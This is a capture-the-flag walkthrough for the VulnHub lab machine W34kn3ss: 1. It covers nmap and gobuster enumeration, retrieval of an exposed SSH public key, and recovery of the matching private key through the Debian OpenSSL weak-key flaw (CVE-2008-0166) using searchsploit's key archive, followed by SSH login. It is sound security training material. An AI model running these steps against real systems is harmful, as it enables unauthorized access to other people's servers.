# W34kn3ss: 1

- **Machine:** W34kn3ss: 1
- **Download:** https://www.vulnhub.com/entry/w34kn3ss-1,270/

![](848-1.png)

---

# Machine Setup

1. Import the **OVA** file into VirtualBox.
2. Click **Finish**.
3. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

Identify the target machine on the local network.

```bash
nmap -sn 192.168.2.0/24
```

![](848-2.png)

---

## Full Port Scan

Perform a complete TCP scan with service detection, operating system detection, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.249
```

![](848-3.png)

---

## Optional Enumeration

Scan all TCP ports.

```bash
nmap -v -p- 192.168.2.249
```

Run service detection.

```bash
nmap -sC -sV -A 192.168.2.249
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.249
```

![](848-4.png)

---

# Web Enumeration

Browse the discovered web services.

```text
http://192.168.2.249
```

```text
https://192.168.2.249/
```

```text
http://192.168.2.249/test/
```

![](848-5.png)

---

## Configure Local Hostname

Edit the hosts file.

```bash
nano /etc/hosts
```

Example entry:

```text
192.168.2.249 weakness.jth
```

![](848-6.png)

Browse the virtual host.

```text
http://weakness.jth/
```

![](848-7.png)

A clue is displayed:

```text
n30
```

---

## Directory Enumeration

Perform directory brute-forcing.

```bash
gobuster dir -u http://weakness.jth/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

![](848-8.png)

Discovered endpoints:

```text
http://weakness.jth/robots.txt
```

```text
http://weakness.jth/private/
```

![](848-9.png)

---

# Information Gathering

Download the exposed files.

```bash
wget http://weakness.jth/private/files/mykey.pub
```

```bash
wget http://weakness.jth/private/files/notes.txt
```

![](848-10.png)

The public SSH key will later be used to recover its matching private key.

---

# Recover the SSH Private Key

Search for the historical OpenSSL Debian vulnerability.

```bash
searchsploit openssl 0.9.8c-1
```

![](848-11.png)

Display the exploit information.

```bash
searchsploit -x 5622
```

![](848-12.png)

Extract the archive.

```bash
tar -xvjf 5622.tar.bz2
```

Navigate to the generated RSA keys.

```bash
cd rsa/2048
```

Search every generated key until the matching public key is found.

```bash
grep -r -l "AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw=="
```

Command explanation:

| Option | Description |
|--------|-------------|
| `-r` | Search recursively through directories |
| `-l` | Display only matching filenames |

![](848-13.png)

The matching filename is the corresponding private SSH key.

---

# SSH Access

Authenticate using the recovered private key.

```bash
ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@weakness.jth
```

Successful login is obtained.

![](848-14.png)

---

# Vulnerability Summary

| No. | Vulnerability | Impact |
|-----|---------------|--------|
| 1 | Sensitive files exposed over HTTP | Disclosure of SSH public key |
| 2 | Weak OpenSSL-generated SSH key | Private key recovery |
| 3 | Predictable cryptographic keys | Unauthorized SSH authentication |
| 4 | Information disclosure through web directories | User enumeration and attack path discovery |

---

# Key Learning

- Always inspect exposed directories such as **/private** or **/backup** during web enumeration.
- Older Debian systems affected by the **OpenSSL predictable random number vulnerability (CVE-2008-0166)** may use weak SSH keys that can be recovered from pre-generated key databases.
- SearchSploit provides exploit code and reference material for historical vulnerabilities.
- Matching a leaked public key against known vulnerable key collections can reveal the corresponding private key, allowing SSH authentication without password cracking.

---

# Summary

The assessment began with network and web enumeration, which identified a hidden virtual host and exposed files under the **/private/** directory. Among these files was an SSH public key associated with the user **n30**. Investigation revealed that the target was affected by the historical **Debian OpenSSL predictable key vulnerability (CVE-2008-0166)**. Using the publicly available weak-key database, the corresponding private key was recovered and successfully used to authenticate via SSH. This machine demonstrates the long-term security impact of predictable cryptographic key generation and the importance of protecting sensitive files from public access.